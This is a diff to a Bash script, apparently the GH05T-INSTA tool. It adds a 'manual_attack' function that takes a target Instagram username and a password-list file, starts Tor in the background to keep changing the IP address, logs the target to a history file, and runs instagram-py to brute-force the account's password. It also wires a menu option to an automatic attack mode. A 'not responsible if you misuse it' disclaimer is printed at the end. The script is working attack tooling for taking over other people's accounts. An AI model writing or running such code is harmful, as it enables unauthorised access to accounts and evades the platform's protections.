@@ -1,5 +1,30 @@
 #!/bin/env bash
 
+manual_attack() {
+	banners
+	read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter Your Instagram Username : \e[0m' username
+	read -p $'  \e[1;92m[\e[0m\e[1;77m++\e[0m\e[1;92m] Enter your password location along with name : \e[0m' passnum
+	brutejson
+	tornotice
+	tor > /dev/null 2>&1 &
+	clear
+	echo "User : $username" >> /usr/cookies/history.txt
+	echo -e "${restar}GH05T-INSTA 3.01 , gh05t tool helps you to automatically change your IP address and fix errors." 
+	instagram-py --username $username --password-list $passnum
+	reopens
+	sleep 3
+	echo -e " \033[1;37m +----------------------------------------------+"
+	echo -e " \033[1;37m |\033[0;31m Developer\033[1;37m :\033[0;34m GH05T HUNTER5   \033[0;31m  version\033[1;37m  :\033[0;34m 3.01\033[1;37m|"
+	echo -e " \033[1;37m |\033[0;31m Powered  \033[1;37m :\033[0;34m Instagram-py    \033[0;31m  antony-jr\033[1;37m:\033[0;34m 2.07\033[1;37m|"
+	echo -e " \033[1;37m +----------------------------------------------+"
+	echo -e " \033[1;37m |              \033[0;31m     disclaimer   \033[1;37m              |"
+	echo -e " \033[1;37m |   We are not responsible if you misuse it    |"
+	echo -e " \033[1;37m |   Never use this tool to do illegal things   |"
+	echo -e " \033[1;37m +----------------------------------------------+"
+	sleep 10
+	exit	
+}
+
 tornotice() {
 	clear
 	echo -e "\033[1;37m +----------------------------------------------+"
@@ -201,6 +226,7 @@ function auto_attack() {
 	sleep 10
 	exit
 }
+
 function banners() {
 	internet_connection
 	clear
@@ -243,7 +269,7 @@ main_menu() {
 	if [ -z $option ]; then
 		main_menu
 	elif [ $option = "01" ] || [ $option = "1" ]; then
-
+		auto_attack
 	elif [ $option = "02" ] || [ $option = "2" ]; then
 
 	elif [ $option = "03" ] || [ $option = "3" ]; then
